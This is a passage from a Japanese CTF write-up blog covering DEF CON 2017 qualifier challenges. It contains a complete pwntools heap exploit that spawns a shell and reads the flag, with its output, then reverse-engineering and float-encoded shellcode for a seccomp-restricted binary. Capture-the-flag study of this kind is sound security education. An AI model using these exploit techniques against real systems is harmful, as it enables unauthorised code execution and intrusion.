<span id="cb17-49"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-49" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
<span id="cb17-50"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-50" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'data: '</span>)</span>
<span id="cb17-51"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-51" aria-hidden="true" tabindex="-1"></a>    r.send(text)</span>
<span id="cb17-52"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-52" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-53"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-53" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> go_away():</span>
<span id="cb17-54"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-54" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="dv">5</span>)</span>
<span id="cb17-55"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-56"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-56" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'alloc 0x38 bytes buffer x5'</span>)</span>
<span id="cb17-57"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-57" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="dv">5</span>):</span>
<span id="cb17-58"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-58" aria-hidden="true" tabindex="-1"></a>    add_request(<span class="st">'buffer</span><span class="sc">{}</span><span class="st">'</span>.<span class="bu">format</span>(i))</span>
<span id="cb17-59"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-59" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-60"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-60" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'free buffer3 and buffer1'</span>)</span>
<span id="cb17-61"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-61" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> [<span class="dv">3</span>, <span class="dv">1</span>]:</span>
<span id="cb17-62"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-62" aria-hidden="true" tabindex="-1"></a>    delete_request(i)</span>
<span id="cb17-63"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-63" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-64"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-64" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'overwrite chunk4 via buffer2'</span>)</span>
<span id="cb17-65"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-65" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">''</span></span>
<span id="cb17-66"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-66" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> buffer_size    <span class="co"># buffer2</span></span>
<span id="cb17-67"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-67" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> <span class="dv">8</span>              <span class="co"># chunk4's size</span></span>
<span id="cb17-68"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-68" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> <span class="dv">8</span>              <span class="co"># chunk4's fd</span></span>
<span id="cb17-69"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-69" aria-hidden="true" tabindex="-1"></a>update_request(<span class="dv">2</span>, buf)</span>
<span id="cb17-70"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-70" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-71"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-71" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'leak chunk4</span><span class="ch">\'</span><span class="st">s bk'</span>)</span>
<span id="cb17-72"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-72" aria-hidden="true" tabindex="-1"></a>choose_action(<span class="dv">2</span>)</span>
<span id="cb17-73"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-73" aria-hidden="true" tabindex="-1"></a>r.recvuntil(buf)</span>
<span id="cb17-74"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-74" aria-hidden="true" tabindex="-1"></a>leak <span class="op">=</span> r.recvuntil(<span class="st">'</span><span class="ch">\n</span><span class="st">'</span>)[:<span class="op">-</span><span class="dv">1</span>]</span>
<span id="cb17-75"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-75" aria-hidden="true" tabindex="-1"></a>addr_chunk2    <span class="op">=</span> u64(leak <span class="op">+</span> <span class="st">'</span><span class="ch">\x00</span><span class="st">'</span> <span class="op">*</span> (<span class="dv">8</span> <span class="op">-</span> <span class="bu">len</span>(leak)))</span>
<span id="cb17-76"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-76" aria-hidden="true" tabindex="-1"></a>addr_heap_base <span class="op">=</span> addr_chunk2 <span class="op">-</span> <span class="bn">0x60</span></span>
<span id="cb17-77"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-77" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">'addr_chunk2:    0x</span><span class="sc">{:x}</span><span class="st">'</span>.<span class="bu">format</span>(addr_chunk2))</span>
<span id="cb17-78"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-78" aria-hidden="true" tabindex="-1"></a>log.success(<span class="st">'addr_heap_base: 0x</span><span class="sc">{:x}</span><span class="st">'</span>.<span class="bu">format</span>(addr_heap_base))</span>
<span id="cb17-79"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-79" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-80"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-80" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'write shellcode to buffer0'</span>)</span>
<span id="cb17-81"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-81" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">''</span></span>
<span id="cb17-82"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-82" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> asm(shellcraft.sh())</span>
<span id="cb17-83"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-83" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> (buffer_size <span class="op">-</span> <span class="dv">8</span> <span class="op">-</span> <span class="bu">len</span>(buf))    <span class="co"># buffer0</span></span>
<span id="cb17-84"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-84" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'</span><span class="ch">\xeb\xce</span><span class="st">'</span>       <span class="co"># $ rasm2 -a x86 -b 64 'jmp -0x30'</span></span>
<span id="cb17-85"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-85" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'</span><span class="ch">\x90</span><span class="st">'</span> <span class="op">*</span> (<span class="bn">0x80</span> <span class="op">-</span> <span class="bu">len</span>(buf))</span>
<span id="cb17-86"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-86" aria-hidden="true" tabindex="-1"></a>update_request(<span class="dv">0</span>, buf)</span>
<span id="cb17-87"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-87" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-88"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-88" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'overwrite chunk4 via buffer2'</span>)</span>
<span id="cb17-89"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-89" aria-hidden="true" tabindex="-1"></a>buf <span class="op">=</span> <span class="st">''</span></span>
<span id="cb17-90"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-90" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> buffer_size</span>
<span id="cb17-91"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-91" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p64(<span class="bn">0x41</span>)                    <span class="co"># size</span></span>
<span id="cb17-92"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-92" aria-hidden="true" tabindex="-1"></a>buf <span class="op">+=</span> p64(addr_puts_got <span class="op">-</span> <span class="bn">0x18</span>)    <span class="co"># fd</span></span>
<span id="cb17-93"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-93" aria-hidden="true" tabindex="-1"></a>update_request(<span class="dv">2</span>, buf)</span>
<span id="cb17-94"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-94" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-95"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-95" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'free buffer4'</span>)</span>
<span id="cb17-96"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-96" aria-hidden="true" tabindex="-1"></a>delete_request(<span class="dv">4</span>)</span>
<span id="cb17-97"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-97" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-98"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-98" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'trigger shellcode'</span>)</span>
<span id="cb17-99"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-99" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb17-100"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb17-100" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
<pre><code>$ ./exploit.py remote
[+] Opening connection to beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me on port 6969: Done
[+] login successful!
[*] alloc 0x38 bytes buffer x5
[*] free buffer3 and buffer1
[*] overwrite chunk4 via buffer2
[*] leak chunk4's bk
[+] addr_chunk2:    0x17e6060
[+] addr_heap_base: 0x17e6000
[*] write shellcode to buffer0
[*] overwrite chunk4 via buffer2
[*] free buffer4
[*] trigger shellcode
[*] Switching to interactive mode
$ ls
beatmeonthedl
flag
$ cat flag
The flag is: 3asy p33zy h3ap hacking!!
$ 
[*] Closed connection to beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me port 6969</code></pre>
<h2 id="floater">floater</h2>
<p>x86-64 の ELF.</p>
<pre><code>$ file floater
floater: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=303c68e5ee9256abcf9e3d1297eaf1e48e2e72fe, stripped, with debug_info

$ checksec --file floater 
[*] '/tmp/floater'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre>
<p>プログラムの主な処理を調べていくと次のような感じだった. いわゆるシステムコールが制限された環境での shellcode 問題なのがわかるが, shellcode を流し込む方法がちょっと特殊.</p>
<ol type="1">
<li><code>mmap</code> で読み書き可な領域を確保</li>
<li>25回入力を読み込み, それぞれある処理 (後述) をしてから確保した領域に書き込む</li>
<li>確保した領域を <code>mprotect</code> で書き込み不可/実行可にする</li>
<li>seccomp で <code>open</code>, <code>read</code>, <code>write</code>, <code>close</code>, <code>exit</code> 以外の システムコールを無効にする</li>
<li>確保した領域を <code>call</code> する</li>
</ol>
<p>その25回入力を読み込んでいる部分がこんな感じ.<br />
<code>read</code> で読み込んだ文字列を <code>strtof</code> で <code>float</code> に変換し, その値を <code>sub.pow_6f0</code> で処理した結果 (<code>xmm0</code>, 4つの <code>float</code> か 2つの <code>double</code> が入る 128bits の SSE レジスタ) を確保した領域に <code>movss</code> (<strong>mov</strong>e <strong>s</strong>calar <strong>s</strong>ingle-precision floating-point value) で書き込んでいるのがわかる.</p>
<pre><code>|       .-&gt; 0x000014f8      83bd6cffffff.  cmp dword [rbp - counter], 0x32 ; [0x32:4]=0x400000 ; '2'
|      ,==&lt; 0x000014ff      0f8d57000000   jge 0x155c
|      ||   0x00001505      31ff           xor edi, edi
|      ||   0x00001507      ba64000000     mov edx, 0x64               ; 'd'
|      ||   0x0000150c      488db570ffff.  lea rsi, qword [rbp - local_90h]
|      ||   0x00001513      e8d8080000     call sub.read_df0          ; ssize_t read(int fildes, void *buf, size_t nbyte)
|      ||   0x00001518      31d2           xor edx, edx
|      ||   0x0000151a      89d6           mov esi, edx
|      ||   0x0000151c      488dbd70ffff.  lea rdi, qword [rbp - local_90h]
|      ||   0x00001523      898534ffffff   mov dword [rbp - local_cch], eax
|      ||   0x00001529      e8c2fbffff     call sym.imp.strtof         ; xmm0 &lt;- result; float strtof(const char *str, char**endptr)
|      ||   0x0000152e      bf03000000     mov edi, 3
|      ||   0x00001533      e8b8010000     call sub.pow_6f0
|      ||   0x00001538      4863b56cffff.  movsxd rsi, dword [rbp - counter]
|      ||   0x0000153f      488b4de0       mov rcx, qword [rbp - mmaped_buf]
|      ||   0x00001543      f30f1104b1     movss dword [rcx + rsi*4], xmm0
|      ||   0x00001548      8b856cffffff   mov eax, dword [rbp - counter]
|      ||   0x0000154e      83c002         add eax, 2
|      ||   0x00001551      89856cffffff   mov dword [rbp - counter], eax
|      |`=&lt; 0x00001557      e99cffffff     jmp 0x14f8
|      |       ; JMP XREF from 0x000014ff (main)
|      `--&gt; 0x0000155c      b8c8000000     mov eax, 0xc8</code></pre>
<p>そして<code>sub.pow_6f0</code> の処理は, 入力した値 * 1000 + 0.5 を <a href="http://en.cppreference.com/w/c/numeric/math/floor"><code>floor</code></a> してから 1000 で割った値を <code>float</code> で返すというものだった.</p>
<p>まとめると,</p>
<ol type="1">
<li><strong>shellcode は↑の処理を通しても変化しない25個の <code>float</code> 値で送る必要がある</strong>
<ul>
<li>小数点以下の数を持っていなければいい?</li>
</ul></li>
<li><strong>shellcode の 4bytes 毎に 0x00000000 が入ることを考慮する必要がある</strong>
<ul>
<li>送られた <code>float</code> 値 (32bits) は 64bits の領域に順に書き込まれるため</li>
</ul></li>
</ol>
<p>いろいろ試したところ, shellcode を 3bytesの命令 + 0x68 (<code>push imm32</code>) で構成することで上手く行った.<br />
例えば <code>mov rdi, rax</code> は 0x48 0x89 0xc7, <code>push 0</code> は 0x68 0x00 0x00 0x00 0x00 となり, little-endian に直したときの下位 32bits の値 0x68c78948 を <code>float</code> として解釈してみると 7.538266577407427e+24 になるという感じである.</p>
<pre><code>$ python
Python 2.7.13 (default, Feb 11 2017, 12:22:40) 
[GCC 6.3.1 20170109] on linux2
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; import struct
&gt;&gt;&gt; struct.unpack('!f', '\x68\xc7\x89\x48')[0]
7.538266577407427e+24</code></pre>
<p>実際に作成したスクリプトと実行結果は次の通り.<br />
使えるシステムコールが限定されているので, Flag を <code>open</code> -&gt; <code>read</code> -&gt; <code>write</code> する shellcode を書いた. この縛りでファイル名 <code>"flag"</code> を生成することは厳しかったので, 最初に <code>read</code> してこちらから送り込むことで対処した. また, <code>mov rdi, 数値</code> のような命令は 3bytes に収まらないので, <code>xor rax, rax ; lea rdi, [rax+数値]</code> のような命令で何とかした.</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb22-1"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
<span id="cb22-2"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-3"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="co"># DEF CON 2017 Quals : floater</span></span>
<span id="cb22-4"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-5"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb22-6"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> struct</span>
<span id="cb22-7"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> sys</span>
<span id="cb22-8"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-9"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-9" aria-hidden="true" tabindex="-1"></a>context(os<span class="op">=</span><span class="st">'linux'</span>, arch<span class="op">=</span><span class="st">'amd64'</span>)</span>
<span id="cb22-10"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-11"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="st">'remote'</span> <span class="kw">in</span> sys.argv:</span>
<span id="cb22-12"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-12" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> remote(<span class="st">'floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me'</span>, <span class="dv">754</span>)</span>
<span id="cb22-13"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-13" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
<span id="cb22-14"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-14" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> process(<span class="st">'./floater-patched'</span>)</span>
<span id="cb22-15"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-16"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-16" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">=</span> [</span>
<span id="cb22-17"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-17" aria-hidden="true" tabindex="-1"></a>    <span class="co"># read(0, stack, 0x80)</span></span>
<span id="cb22-18"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-18" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x89\xe6</span><span class="st">'</span>,   <span class="co"># mov rsi, rsp</span></span>
<span id="cb22-19"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-19" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x31\xc0</span><span class="st">'</span>,   <span class="co"># xor rax, rax</span></span>
<span id="cb22-20"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-20" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x89\xc7</span><span class="st">'</span>,   <span class="co"># mov rdi, rax</span></span>
<span id="cb22-21"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-21" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x8d\x50\x10</span><span class="st">'</span>,   <span class="co"># lea rdx, [rax+10]</span></span>
<span id="cb22-22"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-22" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x01\xd2</span><span class="st">'</span>,   <span class="co"># add rdx, rdx (rdx=0x20)</span></span>
<span id="cb22-23"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-23" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x01\xd2</span><span class="st">'</span>,   <span class="co"># add rdx, rdx (rdx=0x40)</span></span>
<span id="cb22-24"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-24" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x01\xd2</span><span class="st">'</span>,   <span class="co"># add rdx, rdx (rdx=0x80)</span></span>
<span id="cb22-25"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-25" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x0f\x05\x90</span><span class="st">'</span>,   <span class="co"># syscall ; nop</span></span>
<span id="cb22-26"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-26" aria-hidden="true" tabindex="-1"></a>    <span class="co"># save big number</span></span>
<span id="cb22-27"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-27" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x49\x89\xd0</span><span class="st">'</span>,   <span class="co"># mov r8, rdx</span></span>
<span id="cb22-28"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-28" aria-hidden="true" tabindex="-1"></a>    <span class="co"># open(stack, 0, 0)</span></span>
<span id="cb22-29"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-29" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x89\xf7</span><span class="st">'</span>,   <span class="co"># mov rdi, rsi</span></span>
<span id="cb22-30"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-30" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x31\xf6</span><span class="st">'</span>,   <span class="co"># xor rsi, rsi</span></span>
<span id="cb22-31"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-31" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x31\xd2</span><span class="st">'</span>,   <span class="co"># xor rdx, rdx</span></span>
<span id="cb22-32"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-32" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x8d\x42\x02</span><span class="st">'</span>,   <span class="co"># lea rax, [rdx+2]</span></span>
<span id="cb22-33"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-33" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x0f\x05\x90</span><span class="st">'</span>,   <span class="co"># syscall ; nop</span></span>
<span id="cb22-34"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-34" aria-hidden="true" tabindex="-1"></a>    <span class="co"># read(fd, stack, 0x80)</span></span>
<span id="cb22-35"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-35" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x89\xc7</span><span class="st">'</span>,   <span class="co"># mov rdi, rax</span></span>
<span id="cb22-36"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-36" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x89\xe6</span><span class="st">'</span>,   <span class="co"># mov rsi, rsp</span></span>
<span id="cb22-37"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-37" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x4c\x89\xc2</span><span class="st">'</span>,   <span class="co"># mov rdx, r8</span></span>
<span id="cb22-38"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-38" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x31\xc0</span><span class="st">'</span>,   <span class="co"># xor rax, rax</span></span>
<span id="cb22-39"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-39" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x0f\x05\x90</span><span class="st">'</span>,   <span class="co"># syscall ; nop</span></span>
<span id="cb22-40"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-40" aria-hidden="true" tabindex="-1"></a>    <span class="co"># write(1, rsp, 0x80)</span></span>
<span id="cb22-41"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-41" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x4c\x89\xc2</span><span class="st">'</span>,   <span class="co"># mov rdx, r8</span></span>
<span id="cb22-42"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-42" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x31\xc0</span><span class="st">'</span>,   <span class="co"># xor rax, rax</span></span>
<span id="cb22-43"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-43" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\xff\xc0</span><span class="st">'</span>,   <span class="co"># inc rax</span></span>
<span id="cb22-44"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-44" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x48\x89\xc7</span><span class="st">'</span>,   <span class="co"># mov rdi, rax</span></span>
<span id="cb22-45"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-45" aria-hidden="true" tabindex="-1"></a>    <span class="st">'</span><span class="ch">\x0f\x05\x90</span><span class="st">'</span>,   <span class="co"># syscall ; nop</span></span>
<span id="cb22-46"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-46" aria-hidden="true" tabindex="-1"></a>]</span>
<span id="cb22-47"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-48"><a href="https://blog.myon.info/entry/2017/05/02/def-con-ctf-2017-qualifier-writeups/#cb22-48" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">'send shellcode'</span>)</span>
